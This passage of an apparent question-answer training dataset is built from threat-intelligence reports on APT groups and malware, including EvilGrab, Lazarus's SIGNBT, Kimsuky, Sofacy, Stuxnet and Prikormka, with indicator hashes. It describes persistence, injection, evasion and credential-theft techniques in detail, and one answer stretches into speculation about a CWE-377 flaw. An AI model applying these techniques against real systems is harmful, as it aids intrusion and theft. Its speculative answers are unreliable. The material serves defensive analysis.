malware variants, such as those listed under the 'MiniDuke' section, aid cybersecurity experts in mitigating threats posed by the Dukes? Explain the significance of having multiple detection names and SHA1 hashes.",
    "output": "A: The identification and categorization of malware variants, such as those listed under the 'MiniDuke' section, aid cybersecurity experts in several ways. Firstly, having multiple detection names (e.g., Backdoor:W32/MiniDuke.A, Trojan-Dropper:W32/MiniDuke.B) allows experts to understand the specific functionality and behavior of each variant, enabling them to tailor their response strategies accordingly. For instance, knowing whether a variant is a backdoor or a trojan dropper helps in prioritizing remediation efforts. Additionally, the SHA1 hashes provide unique identifiers for each malware sample, allowing for precise tracking and blocking of known threats. This granularity ensures that security systems can effectively detect and prevent the spread of these malicious programs. Furthermore, the categorization helps in understanding the evolution of the threat landscape, as new variants can be compared to older ones to identify trends and patterns in the Dukes' tactics, techniques, and procedures (TTPs). This comprehensive approach enhances the overall defensive posture against sophisticated cyberespionage groups like the Dukes.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Stealth Operation\nEvilGrab has three primary components: one .EXE file and two .DLL files. The .EXE file acts as the installer for all of the EvilGrab components. One of the .DLL files serves as a loader for the other .DLL file, which is the main backdoor component. Some variants of EvilGrab delete the .EXE file after installation to cover its tracks more effectively. As noted earlier, the loader file is named fxsst.dll. However, examination of its header states that its actual file name is supposed to be svchost.dll.\nThese components are also encrypted and saved in the registry. To add stealth to its backdoor routines, it uses a legitimate process context's memory space to inject the main backdoor.\nBy default, this backdoor injects itself into the svchost.exe or winlogon.exe process. It also checks if certain processes related to certain security products are running on the affected system. The specific processes targeted are:\n\u2022 avp.exe\n\u2022 klwtblfs.exe\n\u2022 starter.exe\n\u2022 wmifw.exe\nOther variants of this malware also check if other security products are present. It is not clear why EvilGrab specifically targets these products. However, it is possible that the attackers determined that targets for this campaign are likely running these products.\nBig Headline: User Credential Theft\nEvilGrab steals user credentials related to the following applications and/or protocols:\n\u2022 HTTP\n\u2022 HTTPMail\n\u2022 IMAP\n\u2022 Internet Explorer (IE)\n\u2022 Microsoft Outlook\n\u2022 MSN\n\u2022 POP3\n\u2022 Protected Storage\n\u2022 SMTP\n\u2022 Windows Messaging\nEvilGrab steals these credentials by parsing the following registry keys:\n\u2022 HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ Windows Messaging Subsystem\\Profiles\n\u2022 HKCU\\Software\\Microsoft\\Windows Messaging Subsystem\\Profiles\n\u2022 HKCU\\Software\\Microsoft\\Internet Account Manager\\Accounts\n\u2022 HKCU\\Software\\Microsoft\\Office\\Outlook\\\nOMI Account Manager\\Accounts\nIt queries the above keys for related values that correspond to the applications and protocols listed earlier. The values are then decrypted using the system library pstorec.dll.\nIt also steals login credential from IE autocomplete entries. It does this by first parsing the index.dat files in the IE History folder. It then collects autocomplete entries from the following registry key:\nIt then initiates a brute force attack on encrypted credentials using the CryptUnprotectData API. However, it will only try to steal passwords from IE's password-protected sites and MSN Explorer Signup if kav.exe (related to a security product) is not running in the system.\nQ: How does EvilGrab achieve stealth in its operations, particularly in terms of its backdoor routines?",
    "output": "EvilGrab achieves stealth in its operations by using several techniques. First, it consists of three primary components: one .EXE file and two .DLL files. The .EXE file acts as the installer, while one of the .DLL files serves as a loader for the other .DLL file, which is the main backdoor component. Some variants of EvilGrab delete the .EXE file after installation to cover its tracks more effectively. Additionally, these components are encrypted and saved in the registry. To further enhance stealth, EvilGrab uses a legitimate process context's memory space to inject the main backdoor. By default, this backdoor injects itself into the svchost.exe or winlogon.exe process. Moreover, EvilGrab checks if certain processes related to specific security products are running on the affected system, such as avp.exe, klwtblfs.exe, starter.exe, and wmifw.exe. Other variants of this malware also check for the presence of other security products. The reason behind targeting these specific products is unclear, but it is speculated that the attackers determined that targets for this campaign are likely running these products.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: SIGNBT loader\nIn mid-July 2023, we detected a series of attacks on several victims who had been targeted through legitimate security software designed to encrypt web communications using digital certificates. The exact method by which this software was exploited to deliver the malware remains elusive. However, we identified post-exploitation activity within the processes of the legitimate software. In one instance, while examining the memory of the compromised security software from a victim's system, we discovered the presence of the SIGNBT malware accompanied by a shellcode. This shellcode was responsible for launching a Windows executable file directly in memory.\nThe actor uses various tactics to establish and maintain persistence on compromised systems. These include the creation of a file called ualapi.dll in the system folder, which is automatically loaded by the spoolsv.exe process at each system boot. Additionally, in several instances, registry entries were recorded to execute legitimate files for the purpose of malicious side-loading, further ensuring a resilient persistence mechanism.\nMethods for loading the final payload\nLeveraging the spoolsv.exe process for hijacking purposes is a long-standing strategy for Lazarus. Automatically loading the ualapi.dll file after each reboot is not a new technique for this actor. We have seen similar tactics used by the (<https://securelist.com/gopuram-backdoor-deployed-through-3cx-supply-chain-attack/109344/>)Gopuram malware in the past.\nPayload path: C:\\Windows\\system32\\config\\systemprofile\\appdata\\Local\\tw-100a-a00e14d9.tmp\nThe loader process retrieves the first 32 bytes from tw-100a-a00-e14d9.tmp and uses this data as an AES decryption key to decrypt the remaining contents. Once decrypted, the payload, a Windows executable identified as SIGNBT, is loaded directly into memory. In this case, the loaded payload also reads the configuration file from the same path, but with a slightly different file name.\nConfig file: C:\\Windows\\system32\\config\\systemprofile\\appdata\\Local\\tw-100b-a00e14d9.tmp\nInside this file is a base64-encoded string, mirroring the approach used in the previous SIGNBT malware method. The first 32 characters of this string serve as the AES decryption key, while the subsequent data contains configuration information used by the malware. This decrypted configuration data includes details such as three C2 addresses, which are referred to as proxies, sleep intervals, version information, monitored targets, and various other parameters critical to the malware's operation.\nBig Headline: SIGNBT\nThe majority of SIGNBT malware instances are launched through the malware loader, which operates exclusively in memory. Upon execution, the malware begins communicating with the C2 server by sending a beacon after initialization of its configuration data. In its C2 communication, the malware uses distinctive strings that start with SIGNBT. This unique characteristic has earned it the designation of SIGNBT. In addition, the malware uses different prefixes at each stage of its C2 operation to verify and maintain its activities.\nMedium Headline: Prefix name Description\nThe malware employs a multi-step process to create a 24-byte value for various purposes. First, it generates this value with the following components:\n1. 8 bytes of hard-coded value (SIGNBTLG): this is a fixed part of the value and serves to validate the legitimacy of the client's connection.\n2. 8 bytes from the MD5 hash of the hostname: the first 8 bytes of the MD5 hash of the victim's computer name are included, helping to distinguishing each victim.\n3. 8 bytes of randomly generated identifier: another 8 bytes are randomly generated, probably used for session identifiers.\nAfter creating this 24-byte value, the malware generates an additional 24 bytes of random data. These two sets of 24 bytes are then XORed together using another randomly generated 24-byte key. Subsequently, both the resulting value and the 24-byte key are encoded with base64. Finally, these encoded values are combined with either three or seven randomly generated HTTP parameter names. In all future C2 communications, the malware uses a similar structure, making it more challenging to detect and analyze its communications.\nStructure of HTTP POST data\nThe malware uses a mechanism to validate the response data received from the C2 server. Specifically, it checks to see if the response data contains a hard-coded HTML script.\n1 <!DOCTYPE html><html><head></head><body marginwidth=\"0\" marginheight=\"0\"\n2 style=\"background-color:transparent\"><script>\n3 [delivered data]\n4 </script></body></html>\nDuring the validation process, the malware decodes the first 12 bytes from the C2 server using base64, replacing the spaces with plus signs to create a seven-character string. This process is then repeated with the next 12 bytes. The first seven characters from each set are then XORed and compared to the \"success\" string. This repetitive procedure is applied to every HTTP communication sequence to verify that the response aligns with the expected \"success\" criterion.\nNext, the malware sends HTTP requests with the SIGNBTKE header, and if it receives a \"success\" message from the C2 server, it activates the getInfo function within the CCBrush class. This function gathers various information about the victim's computer, such as computer name, product name, OS details, system uptime, CPU information, system locale, time zone, network status, and malware configuration data. After sending this system-specific information, the malware sends another HTTP request with the SIGNBTGC prefix, this time using a randomly chosen embedded HTTP parameter from a list of 100 possible parameter names.\n1 client, output, h, slotname, adk, adf, pi, w, format, url, ea, flash, tt_state, dt, bpp,\n2 bdt, idt, shv, ptt, saldr, frm, ife, pv, ga_vid, ga_sid, ga_hid, ga_fc, nhd, u_tz, u_his,\n3 u_java, u_h, u_w, u_ah, u_aw, u_cd, u_nplug, u_nmime, adx, ady, biw, bih, isw, ish, ifk, 4\n5 scr_x, scr_y, eid, oid, pvsid, pem, loc, eae, brdim, vis, rsz, abl, pfx, fu, bc, ifi, uci,\n6 fsb, dtd, atyp, ei, s, t, bl, imn, ima, imad, aftp, adh, conn, ime, imex, imeh, imea,\n7 imeb, wh, scp, net, mem, sto, sys, rt, zx, su, tb, calp, rui, u, XU, TREX, UID, SID, dr, XDR, dt\nThe data received from the C2 server is decrypted using AES with a decryption key obtained from a SIGNBTLG HTTP request. If the decrypted data is \"keep\", the malware responds with an \"OK\" message using the SIGNBTSR prefix, indicating a successful communication. If there are problems, the malware uses the SIGNBTFI prefix to convey the nature of the problem or failure in communication. To summarize, the C2 communication process can be described as follows:\nC2 communication process\nIf the delivered data does not equal \"keep\", indicating that specific instructions or actions are required, the malware proceeds to invoke the corresponding class and function for backdoor behavior. The SIGNBT malware is equipped with an extensive set of functionalities designed to exert control over the victim's system. To perform these functions, the malware receives instructions from the C2 server in the form of a class name, function name, and any necessary parameters. It then executes the relevant function embedded in the malware's codebase.\nThe name of each backdoor command is straightforward, implementing commonly used Windows commands such as ping, netstat, and systeminfo. It's important to note that the backdoor is capable of implanting an additional payload for auto execution, internally named \"deploy\". This backdoor function receives file paths via command-line arguments decrypted with AES. Using this command, SIGNBT has been observed to implant the phantom DLL we already described in the SIGNBT loader section above.\nBased on the analysis, it is evident that the actor's initial compromise of the victim involved exploiting vulnerabilities within the software exploit. They then proceeded to deploy the SIGNBT malware using a DLL side-loading technique. Furthermore, the actor used the backdoor capability \"deploy\" to implant an additional payload for automated execution. This multifaceted attack demonstrates a high level of sophistication and a deliberate effort to infiltrate and maintain control over the victim's system.\nBig Headline: LPEClient\nUsing the comprehensive backdoor as described above, the actor deploys additional malware in the victim's memory. Notably, these newly delivered malware variants predominantly execute in the system's memory only, without touching the disk. Based on our telemetry, the actor has been observed to deliver such tools as LPEClient and credential dumping utilities to the victim machines.\nAdditional payload delivered by SIGNBT\nThe LPEClient malware is not new and  during an investigation of a defense contractor attack in 2020. It is designed to collect victim information and download additional payloads from a remote server to run in memory. Although it has been previously\nnoted in our threat intelligence reports to our customers, recent discoveries indicate that LPEClient has undergone significant evolution. It now employs advanced techniques to improve its stealth and avoid detection, such as disabling user-mode syscall hooking and restoring system library memory sections. This indicates a continued effort by the threat actors to increase the sophistication and effectiveness of their malware.\n\nBased on the above text, answer a question. How does the SIGNBT malware achieve persistence on compromised systems, and what tactics are used to ensure resilience?",
    "output": "The SIGNBT malware achieves persistence on compromised systems through several tactics. One method involves creating a file called ualapi.dll in the system folder, which is automatically loaded by the spoolsv.exe process at each system boot. Another tactic includes recording registry entries to execute legitimate files for the purpose of malicious side-loading. This ensures a resilient persistence mechanism by leveraging legitimate system processes and files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the Sea Turtle campaign differ from the DNSpionage campaign, and why was it considered more severe?",
    "output": "The Sea Turtle campaign differed from the DNSpionage campaign in its methodology and scope. While both involved DNS hijacking, the Sea Turtle campaign targeted various DNS registrars and registries, making it more severe. The level of access required to successfully engage in DNS hijacking indicated an ongoing, high degree of threat to organizations in the targeted regions. The Sea Turtle campaign was considered more severe because it posed a greater risk to the stability and trust of the global DNS system, potentially undermining the trust users have in the internet.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The \"Kimsuky\" Operation: A North Korean APT?\nFor several months, we have been monitoring an ongoing cyber-espionage campaign against South Korean think-tanks. There are multiple reasons why this campaign is extraordinary in its execution and logistics. It all started one day when we encountered a somewhat unsophisticated spy program that communicated with its \"master\" via a public e-mail server. This approach is rather inherent to many amateur virus-writers and these malware attacks are mostly ignored.\nHowever, there were a few things that attracted our attention:\nThe public e-mail server in question was Bulgarian - mail.bg.\nThe compilation path string contained Korean hieroglyphs.\nThese two facts compelled us take a closer look at this malware -- Korean compilers alongside Bulgarian email command-and-control communications.\nThe complete path found in the malware presents some Korean strings:\nD:rsh\ue002\ue001UAC_dll(\ue004\ue003)Releasetest.pdb\nThe \"rsh\" word, by all appearances, means a shortening of \"Remote Shell\" and the Korean words can be translated in English as \"attack\" and \"completion\", i.e.:\nD:rshATTACKUAC_dll(COMPLETION)Releasetest.pdb\nAlthough the full list of victims remains unknown, we managed to identify several targets of this campaign. According to our technical analysis, the attackers were interested in targeting following organizations\".\nThe Sejong Institute\nThe Sejong Institute is a non-profit private organization for public interest and a leading think tank in South Korea, conducting research on national security strategy, unification strategy, regional issues, and international political economy.\nKorea Institute For Defense Analyses (KIDA)\nKIDA is a comprehensive defense research institution that covers a wide range of defense-related issues. KIDA is organized into seven research centers: the Center for Security and Strategy; the Center for Military Planning; the Center for Human Resource Development; the Center for Resource Management; the Center for Weapon Systems Studies; the Center for Information System Studies; and the Center for\nModeling and Simulation. KIDA also has an IT Consulting Group and various supporting departments. KIDA's mission is to contribute to rational defense policy-making through intensive and systematic research and analysis of defense issues.\nMinistry of Unification\nThe Ministry of Unification is an executive department of the South Korean government responsible for working towards the reunification of Korea. Its major duties are: establishing North Korea Policy, coordinating inter-Korean dialogue, pursuing inter-Korean cooperation and educating the public on unification.\nHyundai Merchant Marine\nHyundai Merchant Marine is a South Korean logistics company providing worldwide container shipping services.\nSome clues also suggest that computers belonging to \"The supporters of Korean Unification\" (http://www.unihope.kr/) were also targeted. Among the organizations we counted, 11 are based in South Korea and two entities reside in China.\nPartly because this campaign is very limited and highly targeted, we have not yet been able to identify how this malware is being distributed. The malicious samples we found are the early stage malware most often delivered by spear-phishing e-mails.\nRead the text above and answer this question: Why did the unusual combination of a Bulgarian email server and Korean compiler strings in the 'Kimsuky' malware attract the attention of cybersecurity experts? What insights can be drawn from this combination regarding the sophistication and origin of the attack?",
    "output": "The unusual combination of a Bulgarian email server and Korean compiler strings in the 'Kimsuky' malware attracted attention because it suggested a more sophisticated operation than initially thought. While the use of a public email server for command-and-control is common among amateur virus-writers, the presence of Korean strings indicated a potential link to North Korea. This combination hinted at a deliberate attempt to obfuscate the origin of the attack while still maintaining a level of control and communication. The compilation path string 'D:rshATTACKUAC_dll(COMPLETION)Releasetest.pdb' further supported this theory, with 'rsh' likely standing for 'Remote Shell' and the Korean words translating to 'attack' and 'completion'. This analysis suggests that the attackers were likely more organized and potentially state-sponsored, using a mix of simple and advanced techniques to evade detection.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Dark Hotel group ensure that their malware does not operate on systems with Korean language settings, and what implications does this have on their potential origins?",
    "output": "The Dark Hotel group's malware is designed to shut down and remove itself from the host system if the infected system's code page is set to Korean. Additionally, the kernel mode keylogger used in Dark Hotel attacks contains Korean characters in its code and may be linked to a South Korean programmer. This suggests that the group is likely of Korean origin and may be partially or fully state-sponsored, particularly given their focus on targeting North Koreans.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why have there been limited high-profile, coercive, and damaging cyber attacks in the Russo-Ukrainian conflict compared to previous conflicts like those in Estonia and Georgia?",
    "output": "The Russo-Ukrainian conflict has seen limited high-profile, coercive, and damaging cyber attacks compared to previous conflicts like those in Estonia and Georgia. Instead, the publicly reported examples of Computer Network Attacks (CNA) in Ukraine mostly include Denial of Service (DoS) and Distributed Denial of Service (DDoS) attacks aimed at undermining telecommunications infrastructure. This approach may be due to Moscow wanting to avoid international criticism similar to that received after its alleged cyber operations in Georgia in 2008 and Estonia in 2007. Instead, Moscow seems to be using more narrowly focused, limited operations in support of strategic state objectives, primarily via sustained cyber espionage rather than widespread attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: On hacktivism\nThe following examples are not intended as a particular criticism of hacktivist tendencies themselves, but rather point to the abuse potential in the prevalence of hacktivism as a commonplace element in the Internet. Threat actors interested in misleading the public and researchers alike with their disruptive activities stand to benefit from doing so under the cover of a hacktivist group. They are thereby afforded a cover of expected anonymity, plausible deniability, and the inherent legitimacy of an Internet-age societal force springing forth from a ground swell of 'community sentiment' (even when said community is nowhere to be found).\nThe following two threat actors have attempted this with varying degrees of success:\nSmall Headline: Lazarus6 the Weak\nThe Lazarus Group [10] represents a cluster of activity stretching back as far as 2009. From that time the group has engaged in a series of infamous attacks, most notably the devastating wiping attack on Sony Pictures Entertainment (SPE) in 2014. Our fi ndings7 tied this cluster together to contain a series of malware families and campaigns suspected of sharing the same provenance but not previously technically correlated. Looking at these different campaigns, we see a pattern emerge characterized by the use of unheard of hacktivist groups as self-assigned perpetrators of each attack. In the case of SPE, the group was 'Guardians of Peace' or GOP. We are meant to believe this is an established hacktivist group despite lacking a visible presence or pedigree before or after the attack.\nSimilarly, the 2012 attack on the Korean newspaper JoongAng Daily [11] that reportedly disrupted operations was plastered with the motto 'Hacked by IsOne', an unheard of attacker. 2013 saw wiper attacks on South Korean institutions [12] using malware designed to overwrite files with Roman army terms 'HASTATI' and 'PRINCPES'8 before corrupting the drive's Master Boot Record. Interestingly, these attacks were claimed by two unheard of groups, the 'New Romantic Cyber Army Team' and the 'WhoIs Team' [14].\n6 Also known as DarkSeoul, Operation Troy, WildPositron and TEMP.Hermit, or in relation to the malware families Destover, Duuzer, Hangman, and SpaSpe.\n7 Initially presented at the 2016 Kaspersky Lab Security Analysts Summit (SAS) in collaboration with AlienVault Labs' Jaime Blasco.\n8 As noted by FireEye researchers, probably a misspelling of 'Pricipes', a term for spearmen or swordsmen [13].\nDespite media coverage, the Lazarus Group's insistence on employing cover groups has done little to persuade onlookers for long as to the provenance of these attacks. This is due, in large part, to the supposed perpetrators' complete lack of pedigree or prevailing Internet presence. Their lifespan is only that of the attack in question. With no entity to trace, follow, or interrogate, attention quickly turns to the more obvious perpetrator of these attacks. However, this misleading tactic has been better employed by another threat actor.\nSmall Headline: Sofacy the Strong\nOne of the most interesting groups in recent years has been Sofacy9. Sofacy is widely believed to belong to a Russian intelligence organization, although this is still a subject of debate. The group has vast resources at its disposal and has produced copious numbers of zero-day exploits, especially in the last three years. Targeting for Sofacy has changed over the years in parallel with the Russian political climate and has included foreign government agencies (intelligence, military and civilian), suspected terrorism targets, media outlets (both foreign and domestic), non-governmental organizations (NGOs), and energy-based companies to name a few. What's most interesting about this group is their effectiveness at conducting deception operations in an effort to afford their sponsors some level of plausible deniability. We will address three instances in which Sofacy is believed to have employed a false front in order to mask its true intentions. As mentioned before, due to the sensitivity of specific data and sources, we will not reconstruct our investigations to prove these are, in fact, acts of Sofacy, but rather present the narrative in the hope of supporting a wider debate.\nVery Small Headline: CyberBerkut\nIn March 2014, a supposedly Ukrainian-based, pro-Russian separatist group calling itself CyberBerkut rose to prominence by conducting various attacks against the Ukrainian government and other entities supporting Ukraine during the annexation of Crimea [15]. The group was extremely active in 2014 and 2015, targeting not only local Ukrainian government and infrastructure, but also NATO resources, US defence companies, and the German Bundestag to name a few. While the group operated under the guise of being part of the larger Anonymous collective, further research has indicated that this may not have been the case. Some researchers in the community have indicated that a connection between Sofacy and CyberBerkut exists [16], with others going as far as stating they are one and the same. When looking at the timeline of events leading up to the annexation of Crimea and the conflict in Donbass, one can certainly make the argument that the actions of CyberBerkut align closely with Russian interests.\nOn 22 February 2014, then President Viktor Yanukovych was ousted by the Ukrainian parliament. Yanukovych eventually fl ed and later surfaced in exile in southern Russia. Following this, on 25 February, the special police forces in Ukraine known as 'Berkut' were dissolved by parliament. In the following weeks, unidentified gunmen, widely believed to be Russian soldiers,\nseized control of various checkpoints and airports throughout Crimea. Around the same time (3 March 2014), the domain cyberberkut[.]org was created and the group made its fi rst public appearance. Before this date, there is no known data showing that the group or its members existed in any capacity. This becomes relevant when looking at the other examples given later in this section, as hacktivist groups tend to have some kind of history supporting their lineage.\n9 Also known as APT28, Tsar Team and Pawn Storm, among others.\nSome of CyberBerkut's attacks also coincidentally targeted the same victims as Sofacy. In January 2015, CyberBerkut conducted attacks against multiple German government websites, including the German Bundestag [17]. Subsequently, in May 2015, the Bundestag was also attacked by what was later confirmed by the German government as Sofacy [18]. While it is not uncommon for two actors to target the same victim, the argument could be made that both attacks were conducted by the same actors, or possibly that some type of 'trade-off' occurred between the two.\nVery Small Headline: CyberCaliphate\nOn 24 December 2014, a new pro-ISIS hacktivist group by the name of CyberCaliphate announced its presence by taking control of the Albuquerque Journal's mobile application and broadcasting propaganda to its subscribers [19]. Then, on 12 January 2015, CyberCaliphate seized control of the United States Central Command (USCENTCOM)'s Twitter and YouTube accounts [20]. In February 2015, they proceeded to compromise Newsweek's Twitter account [21] and also sent propaganda text messages to subscribers using WBOC Maryland's text alert system [22]. Following these attacks, in April 2015, the group lashed out again, this time against a French television station, TV5 Monde [23], where they were able to block broadcasts for 11 stations and seize control of the TV station's social media accounts.\nWhile initial speculation pointed to this being yet another pro-ISIS group attempting to spread their propaganda to the masses, further research turned up interesting data that potentially pointed to a Russian entity, specifically Sofacy, as the real culprit. First, there was no evidence of the group's existence prior to the initial attacks in January. As stated previously, it is not typical for a hacktivist group to have no pedigree or lineage prior to a large defacement such as USCENTCOM. Secondly, FireEye later revealed that the IP address of the website where data from the TV5Monde hack was published was part of the same netblock of previously known Sofacy infrastructure [24]. Additionally, other sources have shown that the registrant information used to register the group's official domain cyb3rc[.]com is linked to other well-known Sofacy domains.\nWhile the exact motivation is unknown, it is believed that CyberCaliphate was created to provide the Sofacy actors a way to conduct psychological operations against certain targets of interest while providing a level of plausible deniability. Whatever the case may be, if it weren't for a couple of small errors on the part of the actors, CyberCaliphate could have remained a useful front for their operations.\n\nHow did the CyberBerkut group rise to prominence, and what evidence suggests a connection to the Sofacy group?",
    "output": "CyberBerkut rose to prominence in March 2014 by conducting various attacks against the Ukrainian government and other entities supporting Ukraine during the annexation of Crimea. The group was extremely active in 2014 and 2015, targeting local Ukrainian government and infrastructure, NATO resources, US defense companies, and the German Bundestag. Evidence suggesting a connection to the Sofacy group includes the alignment of CyberBerkut's actions with Russian interests, the lack of known data showing the group's existence prior to the annexation of Crimea, and the fact that some of CyberBerkut's attacks targeted the same victims as Sofacy, such as the German Bundestag.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What kind of network-based indicators (NBIs) were discovered in the CARBANAK source code, and how do they relate to previous observations of CARBANAK and FIN7 operations?",
    "output": "The CARBANAK source code and binaries contained multiple network-based indicators (NBIs) that significantly overlapped with previously observed CARBANAK backdoor activity and FIN7 operations. These indicators include domain names and TCP endpoints, some of which were new and others that had been previously documented. The status of each NBI was noted as either active in the source code, commented out, or compiled into a binary. This information helps in correlating current activities with past incidents and understanding the broader scope of the threat actors' operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Seduploader malware's use of temporary files, as seen in the APT report, relate to the CWE-377: Insecure Temporary File vulnerability, and what potential risks does this pose?",
    "output": "CWE-377: Insecure Temporary File refers to a vulnerability where an application creates and uses temporary files in an insecure manner, leaving system and application data vulnerable to attack. In the case of the Seduploader malware, as described in the APT report, the dropper component creates a temporary file (named jhuhugit.temp, jhuhugit.tmp, or jkeyskw.temp) as part of an anti-analysis technique. This technique involves writing and reading to the temporary file one million times to delay execution and exhaust security products' analysis limits. While the primary intention of this technique is to evade detection, the use of temporary files in this manner also poses a risk of insecure temporary file vulnerability. An attacker could potentially exploit this vulnerability to manipulate the temporary file, inject malicious code, or steal sensitive information. Furthermore, the fact that the temporary file is created with a predictable name and location makes it easier for an attacker to target. Therefore, the Seduploader malware's use of temporary files, as seen in the APT report, demonstrates a potential risk of CWE-377: Insecure Temporary File vulnerability.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Windows Rootkit Functionality\nStuxnet has the ability to hide copies of its files copied to removable drives. This prevents users from noticing that their removable drive is infected before sharing the removable drive to another party and also prevents those users from realizing the recently inserted removable drive was the source of infection.\nStuxnet via Export 16 extracts Resource 201 as MrxNet.sys. The driver is registered as a service creating the following registry entry:\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MRxNet\\\"ImagePath\" = \"%System%\\drivers\\ mrxnet.sys\"\nThe driver file is a digitally signed with a legitimate Realtek digital certificate. The certificate was confirmed as compromised and revoked on July 16, 2010 by Verisign.\nThe driver scans the following filesystem driver objects:\n\u2022 \\FileSystem\\ntfs\n\u2022 \\FileSystem\\fastfat\n\u2022 \\FileSystem\\cdfs\nA new device object is created by Stuxnet and attached to the device chain for each device object managed by these driver objects. The MrxNet.sys driver will manage this driver object. By inserting such objects, Stuxnet is able to intercept IRP requests (example: writes, reads, to devices NTFS, FAT or CD-ROM devices).\nThe driver also registers to a filesystem registration callback routine in order to hook newly created filesystem objects on the fly.\nThe driver monitors \"directory control\" IRPs, in particular \"directory query\" notifications. Such IRPs are sent to the device when a user program is browsing a directory, and requests the list of files it contains for instance.\nTwo types of files will be filtered out from a query directory result:\n\u2022 Files with a \".LNK\" extension having a size of 4,171 bytes.\n\u2022 Files named \"~WTR[FOUR NUMBERS].TMP\", whose size is between 4Kb and 8Mb; the sum of the four numbers modulo 10 is null. For example, 4+1+3+2=10=0 mod 10\nThese filters hide the files used by Stuxnet to spread through removable drives, including:\n\u2022 Copy of Copy of Copy of Copy of Shortcut to.lnk\n\u2022 Copy of Copy of Copy of Shortcut to.lnk\n\u2022 Copy of Copy of Shortcut to.lnk\n\u2022 Copy of Shortcut to.lnk\n\u2022 ~wtr4132.tmp\n\u2022 ~wtr4141.tmp\nIn the driver file, the project path b:\\myrtus\\src\\objfre_w2k_x86\\i386 \\guava.pdb was not removed.\nGuavas are plants in the myrtle (myrtus) family genus. The string could have no significant meaning; however, a variety of interpretations have been discussed. Myrtus could be \"MyRTUs\". RTU stands for remote terminal unit and are similar to a PLC and, in some environments, used as a synonym for PLCs. In addition, according to Wikipedia, \"Esther was originally named Hadassah. Hadassah means 'myrtle' in Hebrew.\" Esther learned of a plot to assassinate the king and \"told the king of Haman's plan to massacre all Jews in the Persian Empire...The Jews went on to kill only their would-be executioners.\" Symantec cautions readers on drawing any attribution conclusions. Attackers would have the natural desire to implicate another party.\n\nWhat is the significance of the project path found in the Stuxnet driver file, and what potential implications does it have for understanding the origins or intentions of the attackers?",
    "output": "The project path found in the Stuxnet driver file, 'b:\\myrtus\\src\\objfre_w2k_x86\\i386\\guava.pdb', contains the term 'myrtus', which is the genus name for plants in the myrtle family. This has led to various interpretations, including the possibility that 'MyRTUs' could stand for 'My Remote Terminal Units', as RTUs are similar to PLCs (Programmable Logic Controllers) and sometimes used interchangeably. Additionally, 'myrtle' in Hebrew translates to 'Hadassah', which is the original name of Esther, who played a crucial role in preventing a massacre of Jews in the Persian Empire. While these interpretations might suggest potential cultural or symbolic significance, Symantec cautions against drawing definitive attribution conclusions based on this information alone. Attackers may intentionally include misleading clues to implicate others or obfuscate their true intentions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nOur research into these attack campaigns and the Prikormka malware itself suggests that this threat is the first publicly known Ukrainian malware that is being used in targeted attacks.\nIn terms of technical advancement, the attackers didn't demonstrate any sophisticated methods or novel techniques. But whether an attacker uses sophisticated methods or not does not matter as long as they reach their ultimate goal: stealing the sensitive information they need from their targets.\nThe most noteworthy achievement accomplished by the attackers behind  Operation Groundbait is that they have stayed under the radar for over 7 years. The malware has been seen in the wild since at least 2008. This finding is confirmed by the timestamps of binaries, ESET telemetry, and by hosting providers used.\nOperation Groundbait is, after  and , yet another demonstration that that using highly targeted malware for espionage amidst an armed conflict is an everyday reality.\nIndicators of Compromise (IOC) that can be used to identify an infection can be found in Appendix B or on .\nFor any inquiries or to make sample submissions related to the subject,  contact us at:\nMedium Headline: Prikormka droppers:\n42041871308B5711041B7AF69B78F45DF642546C 37F75844C0D0F7F80A699153AF131984D2CE2B6D 029F054A52FE93B0CD6C4D1D815A795EAE9CAAB4 66C143D7C33666903B174F4B94D609BE8791914D 60351035ECDEED071E3FB80AFFE08872A0B582C9 0296191B323900B2BC014E2ACB5E0614C679B682 1BF0E90027EF798727A4496B1928F1FA79146051 76CAE58E4DF4D029155BF2E44BA0F8075DC99020 C0FBE31F1E6E56E93932076BA55A5229E22B5C4A CF09B0CD03C9D0553F0B82827C989D04F1A1FAF1 7C28B907E1053F825478A74FDC1090FBF71DD878 D7F35B66C554EE1076279DF54C4E931651A7A211 2B0FB236DDC0098ADDF051531912FC2601FFCCDC EAB122E5857DF838469B5B00DA0A3BD06DF8DA05 00BCCEBB7614BA270CA2908EE5711F25D3740E7E F908824DB35EFD589449D04E41F8BCEA057F6E52 A8CED2FF8F3D4B77160CB81843652D971469A30B 6002357FB96A786401BAA40A89A85DBA3A7D7AD4 E3E9CA2AC83CFADD80FECD002B377B6B41AC5250 EAFC458AAC3F1564E940BAC7D45C1E659636CC86 FCBC8C75246511F9E4D49FE501F956A857FACE84 803C48A93785581AA89422B6B1E73677BF8DC749 87C34623EBEC481FD430F6CE26849220C641742C A1EE4E4BA27B4035F29FA6AB943AE072D42E65B8 19AAB5FAE0809F87EF27A18208A3C0C52DEA182A C88218C2C23555D5E39596B2110BDA54A7AD50DB EC16141D6C0399B74A26B7B572580B3AC4CBC811 76B77E40182DA242307272B9F77132ABB0B46515 7AB44936E5545C5778C697ABCC20FD8955E35F36 86DD049877B564158020AB9B1A6CA3C30371979D 8665C7A753BA5F619FE79D52DC49724F17D81DAC\nn2BF9CA8B16BCD679AFB6E9E53C3BB0B04E65044A 9551C390B2DF178DED895D531F440FDDBAE122AA BB8D93A4049968C6D5A243DCFB65A6F4B4DE22A2 80CB14652E8251C79187DF8A01D29ABD46A3118C 